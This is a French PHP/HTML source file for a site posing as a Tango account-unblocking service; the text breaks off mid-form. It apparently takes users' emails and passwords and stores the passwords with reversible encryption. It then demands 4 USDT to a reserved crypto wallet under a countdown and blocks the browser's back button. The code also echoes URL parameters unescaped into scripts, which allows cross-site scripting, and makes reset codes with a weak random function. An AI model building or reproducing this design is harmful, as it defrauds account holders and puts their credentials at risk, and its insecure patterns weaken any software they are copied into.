
<?php
    ob_start();
    header('Content-Type: text/html; charset=utf-8');
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


session_start();
$page = $_GET['page'] ?? 'dashboard';
$type = $_GET['type'] ?? '';

// ================= CONFIG & DB =================


require_once 'config.php';
require_once 'mail.php';


require_once "release_wallets.php";
// Traitement de l'oubli de mot de passe
if(isset($_POST['send_otp'])){
    $email = trim($_POST['email_reset']);
    $stmt = $pdo->prepare("SELECT id FROM users WHERE email = ?");
    $stmt->execute([$email]);
    $user = $stmt->fetch();

    if($user){
        $otp = rand(100000, 999999);
        $expire = date("Y-m-d H:i:s", time() + 600); // 10 min
        
        $update = $pdo->prepare("UPDATE users SET verify_code = ?, code_expire = ? WHERE email = ?");
        $update->execute([$otp, $expire, $email]);
        
        sendMail($email, "Code de réinitialisation", "Votre code est : $otp");
        $_SESSION['reset_email'] = $email;
        header("Location: ?page=verify_reset");
        exit;
    } else {
        $error_reset = "Email introuvable.";
    }
}



   $pdo->query("
CREATE TABLE IF NOT EXISTS demandes(

id INT AUTO_INCREMENT PRIMARY KEY,

user_id INT,

site VARCHAR(255),

identifiant VARCHAR(255),

mot_de_passe_crypte TEXT,

payment_id VARCHAR(100),

statut VARCHAR(50) DEFAULT 'en_attente',

expiration_time DATETIME,

montant DECIMAL(10,2),

created_at DATETIME,

wallet_address VARCHAR(255),

txid VARCHAR(255)

)
");

$pdo->query("
CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) UNIQUE,
    password TEXT,
    verify_code VARCHAR(255),
    code_expire DATETIME,
    verified TINYINT(1) DEFAULT 0,
    attempts INT DEFAULT 0,
    created_at DATETIME
)
");



function crypter($d, $k){ $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc')); return base64_encode(openssl_encrypt($d,'aes-256-cbc',$k,0,$iv).'::'.$iv); }
function decrypter($d, $k){ list($e,$iv)=explode('::',base64_decode($d),2); return openssl_decrypt($e,'aes-256-cbc',$k,0,$iv); }

if(isset($_POST['login_admin'])){

    if($_POST['admin_pwd'] === $mot_de_passe_admin){

        session_regenerate_id(true);

        $_SESSION['admin'] = true;

    }else{

        $error = "Mot de passe incorrect";

    }

}
if(isset($_GET['logout'])){
    unset($_SESSION['admin']);
    header("Location: ?page=dashboard");
    exit;
}
if(isset($_GET['delete']) && isset($_SESSION['admin'])) {
    $pdo->prepare("DELETE FROM demandes WHERE id=?")->execute([$_GET['delete']]);
    header("Location: ?page=admin");
    exit;
}
$sent = false;
// ================= INSCRIPTION =================
if(isset($_POST['ajouter'])){

    $email = trim($_POST['identifiant']);
    $mdp   = trim($_POST['mdp']);
    $site  = trim($_POST['site']);

    // Vérifier que l'email existe et que le compte est vérifié
    $check = $pdo->prepare("SELECT * FROM users WHERE email = ? AND verified = 1");
    $check->execute([$email]);
    $user = $check->fetch(PDO::FETCH_ASSOC);

  if(!filter_var($email, FILTER_VALIDATE_EMAIL)){

    $error_email = "Email invalide";

}
elseif(!$user){

    $error_login = "❌ Cet e-mail n'est pas inscrit ou n'a pas été vérifié. Veuillez d'abord créer un compte.";

}
elseif(!password_verify($mdp, $user['password'])){

    $error_login = "❌ Mot de passe incorrect.";

}
else{

    // Facultatif mais recommandé
    $_SESSION['user_id'] = $user['id'];

        $payment_id = bin2hex(random_bytes(16));

        $montant = 4.00;

        $expiration = date('Y-m-d H:i:s', time() + 600);

        $created_at = date('Y-m-d H:i:s');

     $stmt = $pdo->prepare("
    SELECT * FROM wallets
    WHERE status='free'
    ORDER BY last_used_at ASC
    LIMIT 1
");
$stmt->execute();
$wallet = $stmt->fetch(PDO::FETCH_ASSOC);

if(!$wallet){
    die("Aucun wallet disponible");
}

$wallet_address = $wallet['address'];

// on réserve le wallet immédiatement
try {

    $pdo->beginTransaction();

    $stmt = $pdo->prepare("
        UPDATE wallets
        SET status='reserved',
            reserved_payment_id=?,
            reserved_at=NOW(),
            last_used_at=NOW()
        WHERE id=? AND status='free'
    ");

    $stmt->execute([
        $payment_id,
        $wallet['id']
    ]);

    if ($stmt->rowCount() == 0) {
        throw new Exception("Wallet déjà réservé");
    }

    $stmt = $pdo->prepare("
        INSERT INTO demandes(
            user_id,
            site,
            identifiant,
            mot_de_passe_crypte,
            payment_id,
            expiration_time,
            montant,
            created_at,
            wallet_address
        ) VALUES (?,?,?,?,?,?,?,?,?)
    ");

    $stmt->execute([
        $_SESSION['user_id'] ?? null,
        $site,
        htmlspecialchars($email),
        crypter($mdp,$cle_cryptage),
        $payment_id,
        $expiration,
        $montant,
        $created_at,
        $wallet_address
    ]);

    $pdo->commit();

} catch (Exception $e) {
    $pdo->rollBack();
    die("Erreur paiement : " . $e->getMessage());
}

        header("Location: ?page=paiement&type=".urlencode($site)."&pid=".$payment_id);
        exit;

    
        }

}
// ================= INSCRIPTION =================
if(isset($_POST['inscrire'])){

    $email = trim($_POST['email_inscription']);
    $mdp   = trim($_POST['mdp_inscription']);

    // Vérifie que c'est une adresse Gmail
    if(!preg_match('/^[a-zA-Z0-9._%+-]+@gmail\.com$/i', $email)){

        $error_inscription = "❌ Veuillez utiliser une adresse Gmail (@gmail.com).";

    } else {

        $check = $pdo->prepare("SELECT * FROM users WHERE email=?");
        $check->execute([$email]);

        if($check->rowCount() > 0){

            $error_inscription = "Email déjà utilisé";

        } else {

            $code = rand(100000, 999999);
            $expire = date("Y-m-d H:i:s", time() + 600);

            $save = $pdo->prepare("
                INSERT INTO users(
                    email,
                    password,
                    verify_code,
                    code_expire,
                    verified,
                    attempts,
                    created_at
                )
                VALUES(?,?,?,?,?,?,?)
            ");

            $save->execute([
                $email,
                password_hash($mdp, PASSWORD_DEFAULT),
                $code,
                $expire,
                0,
                0,
                date("Y-m-d H:i:s")
            ]);

            sendMail($email, "Code de vérification", "Votre code est : $code");

            $_SESSION['verify_email'] = $email;

            header("Location: verify.php");
            exit;
        }
    }
}

// ================= CONTACT =================

if(isset($_POST['envoyer_message'])){

    $email_saisi = trim($_POST['email_saisi']);
    $message = trim($_POST['message_content']);

    if(empty($email_saisi) || empty($message)){

        $erreur_contact = "Tous les champs sont obligatoires.";

    }else{

        $stmt = $pdo->prepare("SELECT id FROM users WHERE email=?");
        $stmt->execute([$email_saisi]);

        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if(!$user){

            $erreur_contact = "Cet e-mail n'est pas inscrit sur la plateforme.";

        }else{

            $stmt = $pdo->prepare("INSERT INTO messages_contact(user_id,email,message) VALUES(?,?,?)");

            $stmt->execute([
                $user['id'],
                $email_saisi,
                $message
            ]);

            $succes_contact = "Votre message a été envoyé avec succès.";

        }

    }

}
$data = $pdo->query("SELECT * FROM demandes ORDER BY id DESC")->fetchAll(PDO::FETCH_ASSOC);
?>

<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Déblocage Compte Tango</title>
<style>
/* === FOND ET STRUCTURE DE BASE === */
* { box-sizing: border-box; }

body{
    margin:0;
    padding:0;
    min-height:100vh;
    background:url("bg-tango.png") center center/cover no-repeat;
    background-color:#1a1038;
}
.card{

background:rgba(20,22,35,.82);

border-radius:28px;

padding:45px;

border:1px solid rgba(255,255,255,.08);

box-shadow:
0 12px 35px rgba(0,0,0,.35),
0 0 30px rgba(255,0,120,.15);

transition:
transform .30s,
box-shadow .30s;

overflow:hidden;

position:relative;

}

@supports(backdrop-filter:blur(18px)){

.card{

background:rgba(255,255,255,.05);

backdrop-filter:blur(18px);

-webkit-backdrop-filter:blur(18px);

}
.card::before{
    content:"";
    position:absolute;
    top:0;
    left:0;
    width:100%;
    height:45%;

    background:linear-gradient(
        rgba(255,255,255,.18),
        rgba(255,255,255,0)
    );

    pointer-events:none;
}
}
/* === NOTIFICATIONS FLOTTANTES === */
.floating-success {
    position: fixed;
    top: 20px;
    right: 20px;
    background: #00c96b;
    color: white;
    padding: 14px 20px;
    border-radius: 12px;
    font-size: 14px;
    z-index: 9999;
    box-shadow: 0 0 20px rgba(0,200,100,.35);
    animation: fadeIn .3s;
}

.floating-error {
    position: fixed;
    top: 20px;
    right: 20px;
    background: rgba(255,0,80,0.95);
    color: white;
    padding: 14px 20px;
    border-radius: 12px;
    font-size: 14px;
    z-index: 9999;
    box-shadow: 0 0 20px rgba(255,0,80,.35);
    animation: fadeIn .3s;
}
@media(max-width:768px){

.floating-error,
.floating-success{

left:10px;
right:10px;
width:auto;

}

}
    @media(max-width:768px){

.sidebar{

width:220px;

}

}
    @media(max-width:768px){

.payment-box{

padding:18px;

}

}
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
}

/* === MENU ET BARRE LATERALE === */
.sidebar-toggle {
    position: fixed;
    top: 20px;
    left: 20px;
    z-index: 1000;
    background: rgba(255, 255, 255, 0.1);
    border: 1px solid rgba(255, 255, 255, 0.2);
    color: white;
    border-radius: 10px;
    padding: 10px 14px;
    font-size: 22px;
    cursor: pointer;
    backdrop-filter: blur(10px);
    transition: background 0.3s, transform 0.2s;
}
.sidebar-toggle:hover { background: rgba(255, 255, 255, 0.2); }
.sidebar-toggle:active { transform: scale(0.95); }

.sidebar {
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 260px;
    background: rgba(0, 0, 0, 0.5);
    backdrop-filter: blur(25px);
    -webkit-backdrop-filter: blur(25px);
    border-right: 1px solid rgba(255, 255, 255, 0.1);
    padding: 90px 20px 30px 20px;
    display: flex;
    flex-direction: column;
    z-index: 999;
    transform: translateX(0);
   transition:transform .25s ease;
}
.sidebar.hidden { transform: translateX(-100%); }
.sidebar h1 { color: white; text-align: center; margin-bottom: 40px; font-size: 28px; letter-spacing: 1px; margin-top: 0; }
.sidebar a {
    color: white; text-decoration: none; padding: 15px 20px; margin-bottom: 10px;
    border-radius: 12px; background: rgba(255, 255, 255, 0.05); transition:
transform .3s,
opacity .3s,
background .3s;
    font-weight: 600; font-size: 16px; border: 1px solid transparent; position: relative; overflow: hidden;
}
.sidebar a:hover, .sidebar a.active { background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.2); }
.sidebar a::before {
    content: ""; position: absolute; left: 0; top: 0; width: 4px; height: 100%;
    background: #ff2ea6; transform: scaleY(0); transition: .3s;
}
.sidebar a:hover::before, .sidebar a.active::before { transform: scaleY(1); }

/* === CONTENU PRINCIPAL === */
.main-content {
    flex: 1;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    padding: 20px;
    padding-left: 280px;
    width: 100%;
    min-height: 100vh;
    transition: padding-left 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
}

.bg-glow-1 { position: absolute; width: 12px; height: 12px; background: #fe0979; border-radius: 50%; filter: blur(4px); top: 58%; left: 16%; opacity: 0.8; animation: floatGlow 7s ease-in-out infinite; }
.bg-glow-2 { position: absolute; width: 8px; height: 8px; background: #a200ff; border-radius: 50%; filter: blur(3px); top: 66%; left: 9%; opacity: 0.6; animation: floatGlow 7s ease-in-out infinite; }
.bg-glow-3 { position: absolute; width: 14px; height: 14px; background: #fe0979; border-radius: 50%; filter: blur(5px); top: 45%; right: 15%; opacity: 0.8; animation: floatGlow 7s ease-in-out infinite; }
.bg-glow-4 { position: absolute; width: 10px; height: 10px; background: #ffaa00; border-radius: 50%; filter: blur(4px); bottom: 25%; right: 14%; opacity: 0.5; animation: floatGlow 7s ease-in-out infinite; }

/* === CARTE PRINCIPALE (PREMIUM UI) === */
.card {
    background: rgba(255,255,255,0.03);
    backdrop-filter: blur(25px);
    -webkit-backdrop-filter: blur(25px);
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 30px;
    width: 100%;
    max-width: 520px;
    padding: 50px 45px;
    text-align: center;
    position: relative;
    overflow: hidden;
    transition: .35s;
    animation: zoomIn .6s ease;
}
.card::before {
    content: "";
    position: absolute;
    inset: -2px;
    border-radius: 30px;
    padding: 2px;
    background: linear-gradient(135deg, #ff0088, #8a2be2, #00d4ff, #ff0088);
    background-size: 400% 400%;
    animation: borderMove 8s linear infinite;
    -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
    -webkit-mask-composite: xor;
    mask-composite: exclude;
    pointer-events: none;
}
    @media (max-width:768px){

.bg-glow-1,
.bg-glow-2,
.bg-glow-3,
.bg-glow-4,
.logo-box img{

animation:none;
}

}
  
.card:hover { transform: translateY(-6px); box-shadow: 0 10px 25px rgba(0,0,0,.35), 0 0 60px rgba(255,0,140,.25); }

/* === TITRES === */
.title-top { font-size: 46px; font-weight: 800; margin: 0 auto 5px auto; color: #ffffff; letter-spacing: -0.5px; line-height: 1.1; }
.title-top span { background: linear-gradient(to right, #ff71cd, #ff007f); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: inline-block; }
.title-bottom { font-size: 46px; font-weight: 800; margin: 0 auto 40px auto; color: #ffffff; letter-spacing: -0.5px; line-height: 1.1; }
.title-bottom span { background: linear-gradient(135deg, #ff007f, #e000ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

/* === FORMULAIRES & INPUTS === */
.input-group { position: relative; margin-bottom: 16px; width: 100%; }
select, input, textarea {
    width: 100%; padding: 16px 20px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.15);
    background: rgba(30, 15, 50, 0.4); color: #ffffff; font-size: 15px; transition:
transform .3s,
opacity .3s,
background .3s;
}
input::placeholder { color: rgba(255, 255, 255, 0.4); }
input:hover, select:hover, textarea:hover { border-color: #ff2ea6; }
input:focus, select:focus, textarea:focus { outline: none; box-shadow: 0 0 0 3px rgba(255,0,130,.15), 0 0 25px rgba(255,0,130,.25); }

select {
    appearance: none; -webkit-appearance: none; cursor: pointer;
    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='rgba(255,255,255,0.5)' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><polyline points='6 9 12 15 18 9'></polyline></svg>");
    background-repeat: no-repeat; background-position: right 20px center; background-size: 16px;
}
input[type="text"] {
    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='rgba(255,255,255,0.4)' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z'></path><polyline points='22,6 12,13 2,6'></polyline></svg>");
    background-repeat: no-repeat; background-position: left 20px center; background-size: 18px; padding-left: 52px;
}
input[type="password"] {
    background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='rgba(255,255,255,0.4)' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><rect x='3' y='11' width='18' height='11' rx='2' ry='2'></rect><path d='M7 11V7a5 5 0 0 1 10 0v4'></path></svg>");
    background-repeat: no-repeat; background-position: left 20px center; background-size: 18px; padding-left: 52px;
}
.password-toggle { position: absolute; right: 20px; top: 50%; transform: translateY(-50%); cursor: pointer; opacity: 0.5; }

/* === BOUTONS === */
.btn-login, .btn-register, .btn-back { position: relative; overflow: hidden; transition: .35s; }
button.btn-login {
    width: 100%; padding: 16px; border: none; border-radius: 12px; background: linear-gradient(90deg, #ff0055 0%, #b000cd 100%);
    color: white; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 10px;
}
.btn-register {
    display: block; width: 100%; margin-top: 15px; padding: 16px; border-radius: 12px;
    background: rgba(255,255,255,0.10); color: white; text-decoration: none; font-size: 18px; font-weight: bold; text-align: center;
}
.btn-back { display: block; margin-top: 25px; padding: 12px; border-radius: 12px; background: rgba(255,255,255,0.1); color: white; text-decoration: none; font-weight: bold; text-align: center; }

.btn-login:hover, .btn-register:hover, .btn-back:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(255,0,130,.45); }
.btn-login::before, .btn-register::before {
    content: ""; position: absolute; top: 0; left: -120%; width: 70%; height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,.4), transparent);
    transform: skewX(-25deg); transition: .8s;
}
.btn-login:hover::before, .btn-register:hover::before { left: 150%; }

/* === LOGO & QR === */
.logo-box { display: flex; justify-content: center; margin-bottom: 20px; }
.logo-box img { width: 110px; height: 110px; border-radius: 50%; object-fit: cover; box-shadow: 0 0 30px rgba(255,0,120,.55); animation: pulseLogo 6s infinite; }
.logo-circle {
    width: 45px !important; height: 45px !important; border-radius: 50% !important; overflow: hidden !important;
    margin-left: auto !important; margin-right: auto !important; display: flex !important; align-items: center !important; justify-content: center !important;
    background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); animation: pulseLogo 6s infinite;
}
.logo-circle img { width: auto !important; height: auto !important; max-width: 100% !important; max-height: 100% !important; object-fit: contain !important; transform: scale(1.6) !important; margin: 0 !important; padding: 0 !important; display: block !important; }

.qrcode { display: flex; justify-content: center; margin: 25px 0; }
.qrcode img { width: 100%; max-width: 250px; height: auto; background: white; padding: 8px; border-radius: 12px; }
.qr-title { color: white; font-size: 15px; font-weight: bold; margin-top: 30px; }
.qr-new { max-width:180px; width: 100px; padding: 6px; margin: 8px auto; background: white; border-radius: 12px; transition: .4s; }
.qr-new:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(255,255,255,.35); }

/* === SECTION PAIEMENT === */
.payment-box {
    max-width: 470px; padding: 22px; border-radius: 28px; background: rgba(18,22,38,.78);
    backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,.08);
    box-shadow: 0 20px 60px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.08);
}
.payment-box h2 { font-size: 28px; margin: 12px 0 18px; color: #fff; font-weight: 700; text-align: center; }
.payment-box p { text-align: center; line-height: 1.8; }
.payment-status { background: linear-gradient(90deg,#00c853,#00e676); color: #fff; padding: 12px; border-radius: 14px; text-align: center; font-weight: 700; margin-bottom: 16px; box-shadow: 0 10px 25px rgba(0,200,100,.25); }
.payment-section { background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.06); border-radius: 18px; padding: 16px; margin: 12px 0; transition: .25s; }
.payment-section:hover { transform: translateY(-5px); border-color: #ff2ea6; box-shadow: 0 20px 40px rgba(255,0,130,.18); }
.payment-section h3 { margin: 0 0 10px; font-size: 14px; color: #9aa4bd; }

.amount { font-size: 30px; font-weight: bold; color: #00f7ff; margin: 20px 0; text-shadow: 0 0 15px #00f7ff; }

.network { display: inline-block; padding: 12px 18px; background: linear-gradient(90deg,#ff0057,#9d00ff); border-radius: 50px; color: #fff; font-weight: bold; margin-bottom: 20px; }
.network-pro { display: flex; justify-content: center; align-items: center; gap: 15px; }
.network-pro img { width: 50px; height: 50px; }
.network-pro strong { color: white; font-size: 20px; }
.network-pro span { color: #ffd34f; }

@media(max-width:768px){

.wallet-box{
    flex-direction:column;
    align-items:stretch;
}

.wallet-box input{
    width:100%;
    max-width:none;
}

.wallet-box button{
    width:100%;
}
@media(max-width:768px){

input,
select,
textarea{

padding:14px;

font-size:16px;

}

}
}
.wallet-box:hover { transform: scale(1.02); }
.wallet-box input { flex: 1; max-width: 430px; background: #0b1020; border: 1px solid rgba(255,255,255,.15); color: #fff; border-radius: 12px; padding: 15px; font-size: 15px; }
.wallet-box button { background: linear-gradient(135deg,#ff007f,#8b5cf6); border: none; color: #fff; padding: 15px 25px; border-radius: 12px; cursor: pointer; font-size: 15px; font-weight: bold; transition: .3s; }
.wallet-box button:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(255,0,150,.45); }
.payment-info { color: #ddd; line-height: 1.4; margin-top: 8px; font-size: 14px; }
#timer { margin-top: 12px !important; padding: 12px; font-size: 18px !important; }

/* === ALERTES & FOOTER === */
.warning-box {
    display: flex; align-items: center; gap: 20px; padding: 20px; margin: 25px 0; border-radius: 18px;
    background: linear-gradient(135deg,#3b2357,#1d1738); border: 1px solid rgba(255,255,255,.08); border-left: 6px solid #ffc107; box-shadow: 0 10px 30px rgba(0,0,0,.25);
}
.warning-icon { width: 70px; height: 70px; min-width: 70px; border-radius: 50%; background: linear-gradient(135deg,#ff5e62,#ff9966); display: flex; align-items: center; justify-content: center; font-size: 34px; color: #fff; box-shadow: 0 0 20px rgba(255,120,80,.4); }
.warning-content { text-align: left; }
.warning-title { display: block; color: #fff; font-size: 22px; font-weight: 700; margin-bottom: 8px; }
.warning-content p { margin: 0; color: #d7d7d7; line-height: 1.6; font-size: 15px; }
.warning-content strong { color: #ff5ea8; }
.footer-text { margin-top: 35px; font-size: 14px; color: rgba(255, 255, 255, 0.6); line-height: 1.5; padding: 0 10px; border-top: 1px solid rgba(255, 255, 255, 0.08); padding-top: 25px; }

/* === KEYFRAMES === */
@keyframes borderMove { 0% { background-position: 0% 50%; } 100% { background-position: 400% 50%; } }
@keyframes zoomIn{

0%{

opacity:0;

transform:
translateY(18px)
scale(.98);

}

100%{

opacity:1;

transform:
translateY(0)
scale(1);

}

}
@keyframes floatGlow{

0%,100%{
transform:translate3d(0,0,0);
opacity:.6;
}

50%{
transform:translate3d(0,-25px,0);
opacity:1;
}

}
@keyframes pulseLogo { 0% { box-shadow: 0 0 20px rgba(255,0,120,.25); } 50% { box-shadow: 0 0 45px rgba(255,0,120,.7); } 100% { box-shadow: 0 0 20px rgba(255,0,120,.25); } }

/* === RESPONSIVE MOBILE === */
@media (max-width: 768px) {
    .sidebar { transform: translateX(-100%); }
    .sidebar.show-mobile { transform: translateX(0); }
    .main-content { padding-left: 20px; }
    .card { padding: 35px 20px; }
    .title-top, .title-bottom { font-size: 30px; }
    .wallet-box input { width: 100%; text-align: center; }
    .wallet-box button { width: 100%; }
    .qrcode img { max-width: 220px; }
}
    .card,
.sidebar,
.btn-login,
.btn-register,
.bg-glow-1,
.bg-glow-2,
.bg-glow-3,
.bg-glow-4{
    transform: translateZ(0);
    will-change: transform, opacity;
    backface-visibility: hidden;
}
    .card,
.sidebar,
.sidebar-toggle,
.btn-login,
.btn-register,
.payment-box,
.logo-box img,
.bg-glow-1,
.bg-glow-2,
.bg-glow-3,
.bg-glow-4{

transform:translateZ(0);

will-change:transform,opacity;

backface-visibility:hidden;

}
.bg-glow-1{
animation:floatGlow 12s ease-in-out infinite;
}

.bg-glow-2{
animation:floatGlow 14s ease-in-out infinite;
}

.bg-glow-3{
animation:floatGlow 13s ease-in-out infinite;
}

.bg-glow-4{
animation:floatGlow 15s ease-in-out infinite;
}
.logo-box img{
    animation:pulseLogo 6s infinite;
}

.card{
    animation:zoomIn .6s ease;
}
   
    body::before{

content:"";
position:fixed;
inset:-30px;

background:
radial-gradient(circle at 20% 30%,rgba(255,0,120,.18),transparent 35%),
radial-gradient(circle at 80% 20%,rgba(140,0,255,.18),transparent 35%),
radial-gradient(circle at 50% 80%,rgba(0,180,255,.18),transparent 35%);

pointer-events:none;
z-index:-1;

animation:backgroundFloat 18s ease-in-out infinite;

}

@keyframes backgroundFloat{

0%{
transform:translate3d(0,0,0) scale(1);
}

50%{
transform:translate3d(0,-25px,0) scale(1.04);
}

100%{
transform:translate3d(0,0,0) scale(1);
}

}
</style>

</head>
<body>

<button id="toggleBtn" class="sidebar-toggle" title="Menu">☰</button>

<div id="sidebarMenu" class="sidebar hidden">
    <h1>TANGO</h1>
    <a href="?page=dashboard" class="<?= $page == 'dashboard' ? 'active' : '' ?>">📊 Dashboard</a>
    <a href="?page=admin" class="<?= $page == 'admin' ? 'active' : '' ?>">🔐 Espace Admin</a>
<a href="?page=contact" class="<?= $page == 'contact' ? 'active' : '' ?>" style="display: flex; align-items: center; gap: 10px;">
        <i class="fas fa-envelope"></i> <span>📬 Contactez-nous</span>
    </a>
</div>

<div id="mainContent" class="main-content">
    
    <div class="bg-glow-1"></div>
    <div class="bg-glow-2"></div>
    <div class="bg-glow-3"></div>
    <div class="bg-glow-4"></div>

    <?php if($page=="success"): ?>
    <div class="card" style="max-width: 500px;">
        <h2 style="color:#00f2fe; margin-bottom:20px;">✅ Paiement confirmé</h2>
        <p style="font-size:18px; line-height:1.6; color:white;">Vous allez être redirigé vers votre application.</p>
        <p style="margin-bottom:35px; color: rgba(255,255,255,0.7);">Cliquez sur <b>Continuer</b> pour ouvrir l'assistance Tango.</p>
      <a id="continuer" 
   href="go.php" 
   style="display:inline-block; padding:15px 40px; background:linear-gradient(90deg, #ff0055 0%, #b000cd 100%); color:white; text-decoration:none; font-size:18px; font-weight:bold; border-radius:12px; transition:.3s; text-align:center;">
    Continuer dans Tango Live
</a>
    </div>
    <?php exit; endif; ?>

    <?php if($page=="paiement"): ?>
    <?php if (!isset($_GET['pid'])) { header("Location: ?page=dashboard"); exit; } ?>
  


<div class="card payment-box">

    <div class="logo-circle">
        <img src="IMG_2832.png" alt="Tango">
    </div>

    <h2>
    🔒 Paiement sécurisé
    </h2>

    <div class="payment-status">
        <span>🟢</span>
        En attente du paiement
    </div>
<?php
// On récupère les informations de la base de données (comme dans ton ancien code)
$get = $pdo->prepare("
SELECT montant, wallet_address
FROM demandes
WHERE payment_id=?
");
$get->execute([$_GET['pid']]);
$pay = $get->fetch(PDO::FETCH_ASSOC);

$montant = $pay['montant'];
$wallet = $pay['wallet_address'];
?>
    <div class="payment-section">
        <h3>💰 Montant à envoyer</h3>
        <div class="amount">
            <?= $montant ?> USDT
        </div>
    </div>

    <div class="payment-section">
        <h3>🌐 Réseau</h3>
        <div class="network-pro">
            <img src="bnb.png">
            <div>
                <strong>BNB Smart Chain</strong>
                <br>
                <span>BEP20</span>
            </div>
        </div>
    </div>

    <div class="payment-section">
        <h3>📥 Envoyez le paiement à cette adresse</h3>
        <div class="wallet-box">
            <input
            id="walletAddress"
            readonly
            value="<?= htmlspecialchars($pay['wallet_address']) ?>">
            
            <button onclick="copyWallet()">
            📋 Copier
            </button>
        </div>
    </div>

    <div class="qr-title">
        Scanner pour payer
    </div>

    <img
    src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=<?= urlencode($pay['wallet_address']) ?>"
    class="qr-new">

    <div id="timer"></div>

    <p class="payment-info">
        ✅ Le paiement est détecté automatiquement.<br><br>
        ⚠️ Ne fermez pas cette page jusqu'à la confirmation.
    </p>

    <a href="cancel_payment.php?pid=<?= urlencode($_GET['pid']) ?>" class="btn-back">
        ← Annuler le paiement
    </a>

</div>
 <script>


function showMessage(text, color){

    let box = document.createElement("div");
    box.innerText = text;

    box.style.position = "fixed";
    box.style.top = "20px";
    box.style.left = "50%";
    box.style.transform = "translateX(-50%)";
    box.style.background = color;
    box.style.color = "white";
    box.style.padding = "14px 20px";
    box.style.borderRadius = "12px";
    box.style.zIndex = "9999";
    box.style.boxShadow = "0 0 20px rgba(0,0,0,0.3)";

    document.body.appendChild(box);

    setTimeout(() => {
        box.style.opacity = "0";
        box.style.transition = "0.5s";
        setTimeout(() => box.remove(), 500);
    }, 5000);
}
</script>
<script>
function copyWallet(){

    let text = document.getElementById("walletAddress").value;

    navigator.clipboard.writeText(text)
    .then(function(){

        copiedNotif();

    })
    .catch(function(){

        alert("Impossible de copier.");

    });

}

function copiedNotif(){

    let notif = document.createElement("div");
    notif.innerHTML = "✓ Copié";

    notif.style.position = "fixed";
    notif.style.right = "20px";
    notif.style.top = "50%";
    notif.style.background = "#00c96b";
    notif.style.color = "white";
    notif.style.padding = "10px 18px";
    notif.style.borderRadius = "8px";
    notif.style.fontWeight = "bold";
    notif.style.zIndex = "99999";

    document.body.appendChild(notif);

    setTimeout(function(){

        notif.style.transition = "0.4s";
        notif.style.opacity = "0";

        setTimeout(function(){
            notif.remove();
        },400);

    },3000);
}
</script>
        
    


    <script>
    const duree = 600; const cle = "finPaiement_<?= $_GET['pid'] ?>"; let fin = localStorage.getItem(cle); if (!fin) { fin = Date.now() + duree * 1000; localStorage.setItem(cle, fin); }
    history.pushState(null, "", location.href); window.addEventListener("popstate", function () { history.pushState(null, "", location.href); });
    let timer = setInterval(function () { let temps = Math.floor((fin - Date.now()) / 1000); if (temps < 0) temps = 0; let min = Math.floor(temps / 60); let sec = temps % 60; let el = document.getElementById("timer"); if (!el) return; el.innerHTML = "Temps restant : " + min + "m " + ("0" + sec).slice(-2) + "s"; if (temps <= 0) { fetch("timeout.php?pid=<?= $_GET['pid'] ?>"); localStorage.removeItem(cle); clearInterval(timer); el.innerHTML = "⛔ Temps écoulé"; window.location.href = "?page=dashboard"; } }, 1000);
    setInterval(function() { fetch('check_payment.php?pid=<?= $_GET['pid'] ?>&type=<?= $_GET['type'] ?>').then(res => res.text()).then(data => { if (data.trim() === "paid") { window.location.href = "?page=success&type=<?= $_GET['type'] ?>&pid=<?= $_GET['pid'] ?>"; } }); }, 5000);
    </script>
    <?php exit; endif; ?>

    <?php if($page=="dashboard"): ?>
    <?php if(isset($_GET['success'])): ?>
<div id="successBox" class="floating-success">
    Inscription réussie
</div>
<?php endif; ?>
    <div class="card">
        <div class="logo-box">
   <img src="logo.png" alt="Tango Logo">
</div>
        <h1 class="title-top"><span>Dé</span>blocage</h1>
        <h1 class="title-bottom">Compte <span>Tango</span></h1>

        <form id="loginForm" method="POST" autocomplete="off">
            <div class="input-group">
                <select name="site" required>
                    <option value="">Veuillez sélectionner le problème du compte</option>
                    <option value="Verification refusee">Verification refusée</option>
                    <option value="Compte suspendu">Compte suspendu</option>
                </select>
            </div>

            <div class="input-group">
                <input type="text" name="identifiant" placeholder="Email" required autocomplete="off">
                <?php if(isset($error_email)): ?>
